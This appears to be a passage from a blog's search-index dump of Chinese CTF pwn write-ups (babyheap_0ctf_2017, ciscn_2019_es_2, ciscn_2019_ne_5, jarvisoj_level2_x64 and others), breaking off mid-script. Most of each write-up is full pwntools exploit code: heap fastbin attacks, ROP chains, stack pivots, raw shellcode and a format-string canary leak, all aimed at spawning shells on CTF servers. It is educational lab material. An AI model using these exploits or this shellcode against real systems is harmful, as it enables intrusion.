0000072200000006 R_X86_64_GLOB_DAT 00000000003c67a0 __after_morecore_hook@@GLIBC_2.2.5 + 0 00000000003c3ee0 000008ae00000006 R_X86_64_GLOB_DAT 00000000003c4b00 __memalign_hook@@GLIBC_2.2.5 + 0 00000000003c3ef0 0000044000000006 R_X86_64_GLOB_DAT 00000000003c4b10 __malloc_hook@@GLIBC_2.2.5 + 0 00000000003c3ef8 000000d600000006 R_X86_64_GLOB_DAT 00000000003c67a8 __free_hook@@GLIBC_2.2.5 + 0 00000000003c3fd0 000005cb00000006 R_X86_64_GLOB_DAT 00000000003c4b08 __realloc_hook@@GLIBC_2.2.5 + 0 214: 00000000003c67a8 8 OBJECT WEAK DEFAULT 34 __free_hook@@GLIBC_2.2.5 487: 00000000003c9560 8 OBJECT GLOBAL DEFAULT 34 argp_program_version_hook@@GLIBC_2.2.5 958: 00000000003c92e0 8 OBJECT GLOBAL DEFAULT 34 _dl_open_hook@@GLIBC_PRIVATE 1088: 00000000003c4b10 8 OBJECT WEAK DEFAULT 33 __malloc_hook@@GLIBC_2.2.5 1483: 00000000003c4b08 8 OBJECT WEAK DEFAULT 33 __realloc_hook@@GLIBC_2.2.5 1787: 00000000003c67b0 8 OBJECT WEAK DEFAULT 34 __malloc_initialize_hook@@GLIBC_2.2.5 1826: 00000000003c67a0 8 OBJECT WEAK DEFAULT 34 __after_morecore_hook@@GLIBC_2.2.5 2222: 00000000003c4b00 8 OBJECT WEAK DEFAULT 33 __memalign_hook@@GLIBC_2.2.5 注意，因为默认输出宽度限制的原因，只用readelf -a命令无法输出__malloc_hook而是__m[\u0026hellip;]，必须加上-W或者--width选项才能加宽\n这里有一个小技巧，在__malloc_hook-0x23处malloc可以使size位刚好为0x7f，这样子就可以更改__malloc_hook的值\n我们再用one_gadget命令找一下可用的gadget：\n$ one_gadget libc-2.23.so 0x45226 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x30, environ) constraints: rax == NULL 0x4526a execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x30, environ) constraints: [rsp+0x30] == NULL 0xf03a4 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x50, environ) constraints: [rsp+0x50] == NULL 0xf1247 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x70, environ) constraints: [rsp+0x70] == NULL 因为有些gadget对栈有要求，所以只有一些可以用。试了一下，第二个刚好是可以用的\nallocate(0x60) free(4) # 更改fd指针 payload4 = p64(libc_base+libc.sym[\u0026#39;__malloc_hook\u0026#39;]-0x23) fill(2, payload4) allocate(0x60) allocate(0x60) # 更改__malloc_hook的值 # prev_size+size=0x10，然后要填充0x13的空位才能到__malloc_hook的位置 payload5 = p8(0)*3 + p64(0)*2 + p64(libc_base+0x4526a) fill(6, payload5) 然后allocate任意一个值就可以得到shell啦\n完整exp from pwn import * from pwn import p64, p32, u32, u64, p8 import sys from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./babyheap_0ctf_2017\u0026#34; libc_name: str = \u0026#34;./libc-2.23.so\u0026#34; port: str = \u0026#34;25943\u0026#34; if_32: bool = False if_debug: bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;b* 0x1329\u0026#34;) else: p = process([\u0026#34;ld-2.23.so\u0026#34;, fn], env={\u0026#34;LD_PRELOAD\u0026#34;: libc_name}) # p = process(fn) libc = ELF(libc_name) def allocate(size: int): p.clean() p.sendline(str(1)) p.clean() p.sendline(str(size)) def fill(index: int, payload: bytes): p.clean() p.sendline(str(2)) p.clean() p.sendline(str(index)) p.clean() p.sendline(str(len(payload))) p.clean() p.sendline(payload) def free(index: int): p.clean() p.sendline(str(3)) p.clean() p.sendline(str(index)) def dump(index: int) -\u0026gt; bytes: p.clean() p.sendline(str(4)) p.clean() p.sendline(str(index)) p.recvline() return p.recvuntil(\u0026#34;\\n\u0026#34;)[:-1] allocate(0x10) allocate(0x10) allocate(0x10) allocate(0x10) allocate(0x80) # gdb.attach(p) free(1) free(2) # gdb.attach(p) payload1 = p64(0)*3 + p64(0x21) + p64(0)*3 + p64(0x21) + p8(0x80) fill(0, payload1) payload2 = p64(0)*3 + p64(0x21) fill(3, payload2) allocate(0x10) allocate(0x10) payload3 = p64(0)*3 + p64(0x91) fill(3, payload3) allocate(0x80) free(4) # gdb.attach(p) libc_base = u64(dump(2)[:8].strip().ljust(8, b\u0026#34;\\x00\u0026#34;))-0x3c4b78 success(\u0026#34;libc_base: \u0026#34;+hex(libc_base)) allocate(0x60) free(4) # gdb.attach(p) payload4 = p64(libc_base+libc.sym[\u0026#39;__malloc_hook\u0026#39;]-0x23) fill(2, payload4) allocate(0x60) allocate(0x60) # gdb.attach(p) payload5 = p8(0)*3 + p64(0)*2 + p64(libc_base+0x4526a) fill(6, payload5) # gdb.attach(p) allocate(0x10) p.clean() p.interactive() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/%E9%A6%96%E9%81%93%E5%A0%86%E9%A2%98fastbin-attackunsorted-bin-main_arena-leakbabyheap_0ctf_2017/","section":"writeup","summary":"It is only when the mind and character slumber that the dress can be seen. — Ralph Waldo Emerson 原题链接 这一题是作者的第一道堆题，给作者的第一感受就是神乎其神，在参考了网络上的一些 WP 后写下自己的 WP，如有错误","tags":["pwn","首道堆题","fastbin attack","unsorted bin main_arena leak"],"title":"【首道堆题】【fastbin attack】【unsorted bin main_arena leak】babyheap_0ctf_2017"},{"categories":["writeup"],"contents":" Self-trust is the first secret of success. — Ralph Waldo Emerson\n原题链接\n【栈迁移例题解析】【Write-up】BUUCTF ciscn_2019_es_2 checksec查看程序架构 ida查看程序伪代码 构建exp 栈迁移的基本思路 泄露ebp 开始栈迁移 完整exp checksec查看程序架构 $ checksec --file ciscn_2019_es_2 [*] \u0026#39;/home/peterl/security/workspace/ciscn_2019_es_2/ciscn_2019_es_2\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 没啥特殊的，注意一下32位就可\nida查看程序伪代码 看起来像是栈溢出，但是read函数限制了读入的字节数，我们看一下栈：\n我们发现这时候到return的位置只能溢出一个字，如果这时候程序有一个backdoor函数那就万事大吉。\n我们可以找一下，发现了一个hack函数，但这个hack函数完全就是糊弄人的，从中唯一得到的有用信息是system确乎存在于plt表中，这样就不用ret2libc了：\n看一下源程序也没有格式化字符串漏洞，我们可以考虑栈迁移\n我们只要泄露出ebp，然后再通过第二次leave;ret就可以将esp更改到我们希望的地方\n构建exp 栈迁移的基本思路 我们知道，在call一个函数的时候，我们会先将下一条指令的地址进栈，再将当前的ebp进栈，然后将当前esp的值赋给ebp，这样就实现了备份下一条指令的地址、ebp原本的值、esp原本的值的作用\n然后等到函数结束时，程序会执行leave指令和ret指令。leave指令相当于mov esp, ebp; pop ebp，意思就是从备份中先恢复esp再恢复ebp；ret指令相当于pop eip，意思就是恢复备份的指令地址，这样就能执行函数调用的下一条语句了\n那么如果我们更改栈中备份的ebp数据的同时，在程序执行过一次leave; ret后再执行一遍，那么因为ebp的备份已被更改，所以ebp恢复的就是我们希望的数据，而再执行一遍leave; ret时，程序是假定ebp中保存的是esp的备份，那么通过这种方法，我们就可以成功地更改esp。\n这时我们已经让栈顶指针指向了我们希望的位置，这时由于leave指令，程序会将我们伪造的栈顶的第一个数据pop进ebp，然后由于ret指令再将第二个数据弹进eip中，那么我们就应该在伪造的栈的第二个数据放入system函数的地址\n然后我们就可以当普通的栈溢出构造栈了。\nsystem后面跟个0，再跟/bin/sh的地址就🆗了\n泄露ebp 我们看到源程序中：\nmemset(s, 0, 0x20u); read(0, s, 0x30u); printf(\u0026#34;Hello, %s\\n\u0026#34;, s); 这个s字符数组被初始化为全\\0，此时如果我们将该数组所有的位都覆盖为垃圾数据，那么由于数组中没有\\0了，它就会把紧跟在s后面的数据一齐打印出来，直到遇到一个\\0为止。\n这里需要注意的是如果我们使用sendline函数，程序读入的字符最后会多一个\\n，所以这里发送payload应该用send。同时在payload中使用一个与前面不同的字符做哨兵：\npayload = b\u0026#34;a\u0026#34;*0x27 + b\u0026#34;b\u0026#34; p.clean() p.send(payload) 也就是说我们只要满足：\n刚好输入0x28个数据 输入的最后一个字符与前面输入的不同 就可以了\n那么sendline函数也不是不可以用：\npayload = b\u0026#34;a\u0026#34;*0x27 p.clean() p.sendline(payload) 用\\n字符做哨兵就可以了。\n然后我们就可以recvebp地址了：\np.recvuntil(b\u0026#34;b\u0026#34;) ebp_addr = u32(p.recv(4)) # 我们可以讲礼貌一点，栈迁移完后返回地址和原来一样 eip_addr = u32(p.recv(4)) 开始栈迁移 我们用gdb调试一下，发现当恢复ebp备份值的时候，这个备份值比当时ebp的值刚好多0x10：\n那么我们的payload就出来了：\nleave_ret = 0x080484b8 # command也可以是cat flag command = \u0026#34;/bin/sh\u0026#34; payload = pg(ebp_addr) + pg(m_elf.plt[\u0026#39;system\u0026#39;]) + pg(eip_addr) \\ + pg(ebp_addr - 0x28) + bytes(command.ljust(0x18, \u0026#34;\\0\u0026#34;), encoding=\u0026#34;UTF-8\u0026#34;)\\ + pg(ebp_addr - 0x38) + pg(leave_ret) 完整exp from pwn import * from pwn import p64, p32, u32, u64 # from LibcSearcher import LibcSearcher pss: bool = False fn: str = \u0026#34;./ciscn_2019_es_2\u0026#34; # libc_name:str = \u0026#34;/lib/i386-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;b* 0x80485FD\u0026#34;) else: p = process(fn) m_elf = ELF(fn) p.clean() payload1 = b\u0026#34;a\u0026#34;*0x27 p.sendline(payload1) p.recvuntil(b\u0026#34;\\n\u0026#34;) ebp_addr = u32(p.recv(4)) eip_addr = u32(p.recv(4)) success(hex(ebp_addr)) p.clean() leave_ret = 0x080484b8 command = \u0026#34;/bin/sh\u0026#34; payload = pg(ebp_addr) + pg(m_elf.plt[\u0026#39;system\u0026#39;]) + pg(eip_addr) \\ + pg(ebp_addr - 0x28) + bytes(command.ljust(0x18, \u0026#34;\\0\u0026#34;), encoding=\u0026#34;UTF-8\u0026#34;)\\ + pg(ebp_addr - 0x38) + pg(leave_ret) p.sendline(payload) p.clean() p.interactive() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%BE%8B%E9%A2%98%E8%A7%A3%E6%9E%90ciscn_2019_es_2/","section":"writeup","summary":"Self-trust is the first secret of success. — Ralph Waldo Emerson 原题链接 【栈迁移例题解析】【Write-up】BUUCTF ciscn_2019_es_2 checksec查看程序架构 ida查看程序伪代码 构建exp 栈迁移的基","tags":["pwn","栈迁移"],"title":"【栈迁移例题解析】ciscn_2019_es_2"},{"categories":["writeup"],"contents":" You may say I\u0026rsquo;m a dreamer, but I\u0026rsquo;m not the only one, I hope someday you will join us, and the world will live as one. — John Lennon\n原题链接\n【Write-up】BUUCTF ciscn_2019_ne_5 checksec查看程序架构 ida查看程序伪代码 构建exp checksec查看程序架构 $ checksec --file ciscn_2019_ne_5 [*] \u0026#39;/home/peterl/security/workspace/ciscn_2019_ne_5/ciscn_2019_ne_5\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) ida查看程序伪代码 int __cdecl main(int argc, const char **argv, const char **envp) { int result; // eax int v4; // [esp+0h] [ebp-100h] BYREF char src[4]; // [esp+4h] [ebp-FCh] BYREF char v6[124]; // [esp+8h] [ebp-F8h] BYREF char s1[4]; // [esp+84h] [ebp-7Ch] BYREF char v8[96]; // [esp+88h] [ebp-78h] BYREF int *v9; // [esp+F4h] [ebp-Ch] v9 = \u0026amp;argc; setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); fflush(stdout); *(_DWORD *)s1 = 48; memset(v8, 0, sizeof(v8)); *(_DWORD *)src = 48; memset(v6, 0, sizeof(v6)); puts(\u0026#34;Welcome to use LFS.\u0026#34;); printf(\u0026#34;Please input admin password:\u0026#34;); __isoc99_scanf(\u0026#34;%100s\u0026#34;, s1); if ( strcmp(s1, \u0026#34;administrator\u0026#34;) ) { puts(\u0026#34;Password Error!\u0026#34;); exit(0); } puts(\u0026#34;Welcome!\u0026#34;); puts(\u0026#34;Input your operation:\u0026#34;); puts(\u0026#34;1.Add a log.\u0026#34;); puts(\u0026#34;2.Display all logs.\u0026#34;); puts(\u0026#34;3.Print all logs.\u0026#34;); printf(\u0026#34;0.Exit\\n:\u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;v4); switch ( v4 ) { case 0: exit(0); return result; case 1: AddLog(src); result = sub_804892B(argc, argv, envp); break; case 2: Display(src); result = sub_804892B(argc, argv, envp); break; case 3: Print(); result = sub_804892B(argc, argv, envp); break; case 4: GetFlag(src); result = sub_804892B(argc, argv, envp); break; default: result = sub_804892B(argc, argv, envp); break; } return result; } 首先我们找到了密码为administrator，然后我们看到下面的switch-case语句\n经过分析我们发现只有当case为1时能够输入128个字符：\n但是保存输入的变量不在当前栈中，而且在原本的main函数中传入的参数也只是一个保存地址的4字节变量，因此对原本的main函数也构成不了溢出。\n但是我们又发现，我们在src变量所指的内存中保存的数据会被别的函数利用：\n同时我们发现plt表中有system：\n$ readelf -r ciscn_2019_ne_5 重定位节 \u0026#39;.rel.dyn\u0026#39; at offset 0x3c4 contains 4 entries: 偏移量 信息 类型 符号值 符号名称 08049ff0 00000506 R_386_GLOB_DAT 00000000 stderr@GLIBC_2.0 08049ff4 00000906 R_386_GLOB_DAT 00000000 __gmon_start__ 08049ff8 00000c06 R_386_GLOB_DAT 00000000 stdin@GLIBC_2.0 08049ffc 00000d06 R_386_GLOB_DAT 00000000 stdout@GLIBC_2.0 重定位节 \u0026#39;.rel.plt\u0026#39; at offset 0x3e4 contains 10 entries: 偏移量 信息 类型 符号值 符号名称 0804a00c 00000107 R_386_JUMP_SLOT 00000000 setbuf@GLIBC_2.0 0804a010 00000207 R_386_JUMP_SLOT 00000000 strcmp@GLIBC_2.0 0804a014 00000307 R_386_JUMP_SLOT 00000000 printf@GLIBC_2.0 0804a018 00000407 R_386_JUMP_SLOT 00000000 fflush@GLIBC_2.0 0804a01c 00000607 R_386_JUMP_SLOT 00000000 strcpy@GLIBC_2.0 0804a020 00000707 R_386_JUMP_SLOT 00000000 puts@GLIBC_2.0 0804a024 00000807 R_386_JUMP_SLOT 00000000 system@GLIBC_2.0 0804a028 00000a07 R_386_JUMP_SLOT 00000000 exit@GLIBC_2.0 0804a02c 00000b07 R_386_JUMP_SLOT 00000000 __libc_start_main@GLIBC_2.0 0804a030 00000e07 R_386_JUMP_SLOT 00000000 __isoc99_scanf@GLIBC_2.7 在这题中Display函数没有用，但是如果题目的plt表中system函数就可以通过Display函数泄露基址来ret2libc。\n这里我们看到我们输入的数据在GetFlag函数中会被strcpy保存在它栈中的一个变量中，这样我们就可以间接地栈溢出了\n构建exp from pwn import * from pwn import p64, p32, u32, u64 # from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./ciscn_2019_ne_5\u0026#34; libc_name:str = \u0026#34;/lib/i386-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;25151\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;break main\u0026#34;) else: p = process(fn,env={\u0026#34;LD_PRELOAD\u0026#34;:libc_name}) m_elf = ELF(fn) bin_sh = 0x80482EA p.clean() p.sendline(b\u0026#34;administrator\u0026#34;) p.clean() p.sendline(b\u0026#34;1\u0026#34;) payload = b\u0026#34;a\u0026#34;*(0x48 + 0x4) + \\ pg(m_elf.plt[\u0026#39;system\u0026#39;]) \\ + pg(m_elf.plt[\u0026#39;exit\u0026#39;]) + pg(bin_sh) p.sendline(payload) p.clean() p.sendline(b\u0026#39;4\u0026#39;) p.clean() p.interactive() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/ciscn_2019_ne_5/","section":"writeup","summary":"You may say I\u0026rsquo;m a dreamer, but I\u0026rsquo;m not the only one, I hope someday you will join us, and the world will live as one. — John Lennon 原题链接 【Write-up】BUUCTF ciscn_2019_ne_5 checksec查看程序架构 ida查看程序伪代码 构","tags":["pwn"],"title":"BUUCTF ciscn_2019_ne_5"},{"categories":["writeup"],"contents":" I believe that we are fundamentally the same and have the same basic potential. — Dalai Lama\n原题链接\n【Write-up】BUUCTF Jarvisoj_level2_x64 checksec 查看架构 ida 查看伪代码 构建 exp 完整 exp checksec 查看架构 $ checksec --file level2_x64 [*] \u0026#39;/home/peterl/security/workspace/level2_x64/level2_x64\u0026#39; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 看来该程序是 64 位的，而且因为 NX 不能使用 shellcode\n同时，64 位系统调用 system 还要注意栈对齐的情况，要准备一个ret的 gadget\nida 查看伪代码 我们先运行一下康康：\n$ ./level2_x64 Input: Hello World! 看来有一个输入口，有机会栈溢出，我们用 ida 看看\n这个vulnerable_function属实是有点大摇大摆了\n点进去康康：\n这明摆着是要栈溢出然后调用 plt 表中的 system 函数\n构建 exp 寻找 system 函数地址：\n要注意的是，直接用readelf -r level2_x64命令读到的是.rela.plt 的符号表（涉及到延迟绑定机制，具体可以看这篇博文）\n寻找\u0026quot;\\bin\\sh\u0026quot;：\n$ ROPgadget --binary level2_x64 --string \u0026#34;/bin/sh\u0026#34; Strings information ============================================================ 0x0000000000600a90 : /bin/sh 还好有现成的，不用自己去构建了\n寻找两个 gadget：\n$ ROPgadget --binary level2_x64 --only \u0026#34;pop|ret\u0026#34; Gadgets information ============================================================ 0x00000000004006ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret 0x00000000004006ae : pop r13 ; pop r14 ; pop r15 ; ret 0x00000000004006b0 : pop r14 ; pop r15 ; ret 0x00000000004006b2 : pop r15 ; ret 0x00000000004006ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret 0x00000000004006af : pop rbp ; pop r14 ; pop r15 ; ret 0x0000000000400560 : pop rbp ; ret 0x00000000004006b3 : pop rdi ; ret 0x00000000004006b1 : pop rsi ; pop r15 ; ret 0x00000000004006ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret 0x00000000004004a1 : ret Unique gadgets found: 11 可以找到pop rdi;ret和ret：\n0x00000000004006b3 : pop rdi ; ret 0x00000000004004a1 : ret 然后我们就可以构建 exp 了\n注意，我们在一开始可以不加ret，试过一次如果出现 EOF 再加，如果加了还是报错就说明不是栈对齐的问题\n完整 exp from pwn import * from pwn import p64, p32 pss: bool = False fn: str = \u0026#34;./level2_x64\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libdl.so.2\u0026#34; port: str = \u0026#34;\u0026#34; if_32: bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: p = process(fn,env={\u0026#34;LD_PRELOAD\u0026#34;:\u0026#34;/lib/x86_64-linux-gnu/libdl.so.2\u0026#34;}) ret = 0x4004a1 pop_rdi_ret = 0x4006b3 bin_sh = 0x600a90 system_addr = 0x4004c0 p.recvuntil(b\u0026#34;Input:\\n\u0026#34;) payload = b\u0026#34;a\u0026#34;*0x88 + pg(ret) + pg(pop_rdi_ret) + pg(bin_sh) + pg(system_addr) p.sendline(payload) p.interactive() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/jarvisoj_level2_x64/","section":"writeup","summary":"I believe that we are fundamentally the same and have the same basic potential. — Dalai Lama 原题链接 【Write-up】BUUCTF Jarvisoj_level2_x64 checksec 查看架构 ida 查看伪代码 构建 exp 完整 exp checksec 查看架构 $ checksec --file level2_x64 [*] \u0026#39;/home/peterl/security/workspace/level2_x64/level2_x64\u0026#39; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found","tags":["pwn"],"title":"BUUCTF Jarvisoj_level2_x64"},{"categories":null,"contents":"","date":"2022年12月29日","permalink":"https://peterliuzhi.top/archive/archive/","section":"archive","summary":"","tags":null,"title":"归档"},{"categories":["writeup"],"contents":" It is not so much our friends\u0026rsquo; help that helps us, as the confidence of their help. — Epicurus\n原题链接\nEasyEasyEasy 因为读入的是一个有符号数，所以当输入-1 的时候也是合法的\n而我们知道，-1%256 也是-1，而v5[-1]意为*(v5-1)，指向 v5 前面一个数，而该程序只将 v5 后面的 0x100 个数置零，所以前一个数仍可能为非零。\n事实证明确实如此，直接 nc 进去输入-1 即可\n简单的栈溢出 检查程序架构 查看 ida 反编译代码 限制一次输入得到 shell 权限\n思路一：爆破栈地址后四位 先写入 shellcode，然后要把 ret 值覆盖为 shellcode 地址即栈地址，但是限制一次输入，而且没有输出函数，无法泄露栈地址。 这时候在 ret 值的下面四项的位置保存了一个栈地址：\n但是这个值的倒数第三位和 shellocde 地址一定是不同的 所以我们尝试爆破栈地址末四位\n因为栈地址的最后一位是不变的，所以准确来说只用爆破三位 gets 会将输入的\\n 改为\\x00，所以 payload 只能覆盖到末二位，倒数三四位只能覆盖为\\x00\nfrom pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./chall\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;10072\u0026#34; if_32: bool = False if_debug:bool = True pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) while True: if pss: p = remote(\u0026#34;43.248.98.206\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x40054F c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) # libc = ELF(libc_name) pop_rdi_ret = 0x00000000004005e3 ret = 0x000000000040028d shellcode = asm(shellcraft.sh()) print(hex(len(shellcode))) payload = shellcode + b\u0026#34;\\x00\u0026#34;*(0x8) + pg(ret)*4 + p8(0x00) p.clean() p.sendline(payload) p.clean() p.sendline() try: p.recv(timeout=0.25) p.interactive() except: p.close() 思路二：利用jmp rax或call rax 我们把断点设在leave;ret上，gdb 过去会发现 rax 的值刚好是我们输入的字符串的地址\n那么我们就可以利用jmp rax或call rax跳转到 shellcode\n值得注意的是，这里如果使用 pwntools 生成的 shellcode，因为有七个 push，所以 rsp 会上移，而 shellcode 也是存在栈上的，这时就会覆盖一部分 shellcode\n解决办法有两个：\n使用更短的 shellcode shellcode = b\u0026#39;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\u0026#39; 在跳转到 shellcode 前使 rsp 下移 payload = shellcode.ljust(0x38, b\u0026#34;a\u0026#34;) + pg(ret)*0x5 + pg(call_rax) 完整 exp：\nfrom pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = False fn: str = \u0026#34;./chall\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;10072\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) # while True: if pss: p = remote(\u0026#34;43.248.98.206\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x40054F c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) # libc = ELF(libc_name) ret = 0x000000000040028d jmp_rax = 0x0000000000400485 call_rax = 0x000000000040051e shellcode = b\u0026#39;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\u0026#39; shellcode = asm(shellcraft.amd64.linux.sh()) print(disasm(shellcode)) print(hex(len(shellcode))) payload = shellcode.ljust(0x38, b\u0026#34;a\u0026#34;) + pg(ret)*0x5 + pg(call_rax) p.clean() p.sendline(payload) p.clean() p.interactive() babyrop 此题需要的 libc 版本只能用 ubuntu22 查看程序架构：\n查看 ida 反编译代码：\n有沙箱把 execve 的系统调用给禁了（：谢谢你\n基本思路就是在栈上保存\u0026quot;./flag\\x00\\x00\u0026quot;字符串，然后通过 open、read、write 的系统调用读到 flag\n主要难点是获得./flag 字符串的栈地址（本题 bss 段长度不够，存不了 flag 字符串）\n要点是用mov rdi, rsp; add rdi, 0x40指向 payload 末尾，在末尾保存 flag 字符串\n然后调用依次调用 0x2、0x0、0x1 号系统调用（open、read、write）\n所有的系统调用编号在此\nfrom pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./baby_rop\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libseccomp.so.2\u0026#34; port: str = \u0026#34;10076\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) # while True: if pss: p = remote(\u0026#34;43.248.98.206\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x40131C c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) pop_rdi_ret = 0x0000000000401207 pop_rdx_ret = 0x000000000040120d mov_rsi_rdi_ret = 0x000000000040120f pop_rax_syscall_ret = 0x0000000000401213 ret = 0x000000000040101a read_addr = 0x4012CF gift = 0x00000000004011fb leave_ret = 0x000000000040131c add_rdi_40_ret = 0x00000000004011fe mov_rdi_rsp_ret = 0x0000000000401203 p.clean() payload = \\ b\u0026#34;./flag\\x00\\x00\u0026#34;*0x7 + \\ pg(pop_rdi_ret) + pg(0) + pg(mov_rsi_rdi_ret) +\\ pg(mov_rdi_rsp_ret) + pg(add_rdi_40_ret)*2 +\\ pg(pop_rax_syscall_ret) + pg(0x2) +\\ pg(mov_rsi_rdi_ret) +\\ pg(pop_rdi_ret) + pg(3) +\\ pg(pop_rdx_ret) + pg(0xff)+\\ pg(pop_rax_syscall_ret) + pg(0x0) +\\ pg(pop_rdi_ret) + pg(1) +\\ pg(pop_rax_syscall_ret) + pg(0x1) + pg(0) + b\u0026#34;./flag\\x00\\x00\u0026#34; p.sendline(payload) try: p.interactive() except: p.close() FLAG：flag{6fU9jIyTmarX2EMwJHvQY7SpLuqVbzAN}\nCTF 查看架构：\n有 canary 查看 ida 反编译代码：\n这题有点寄的是没有 main 函数，只有一个 label1 作为程序入口，所以只能看汇编代码，好在不是很复杂：\n大致的逻辑是要经过两个挑战：\n第一个挑战是经典的速算挑战，用 python 的 eval 函数解析读入的计算式就可以了\n第二个挑战是要利用符号位漏洞，我们输入 0x800000000000000c 即可\n这里要注意的是，我们不能直接用 python 输出这个数，因为 python 会自动解析为很大的无符号数。比较简单的方法是使用 Windows 自带的计算器：\n还有另外一种方法是调用ctypes库，创建long long int类型的变量：\noverflow = ctypes.c_longlong(0x800000000000000c) # p.sendline(\u0026#34;-9223372036854775796\u0026#34;) p.sendline(str(overflow.value)) 通过第二个挑战后我们就可以开始第三个挑战。第三个挑战是格式化字符串漏洞用于泄露 canary，然后就是一个栈溢出。\n需要注意的是，64 位系统中的格式化字符串的前五个参数分别存在寄存器 RSI/RDX/RCX/R8/R9 中\nfrom pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher from ctypes import c_longlong as longlong pss: bool = True fn: str = \u0026#34;./CTF\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;10074\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;43.248.98.206\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* $rebase(0x173B) c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) # libc = ELF(libc_name) p.recvuntil(b\u0026#34;and tell you a secret \u0026#34;) getshell = 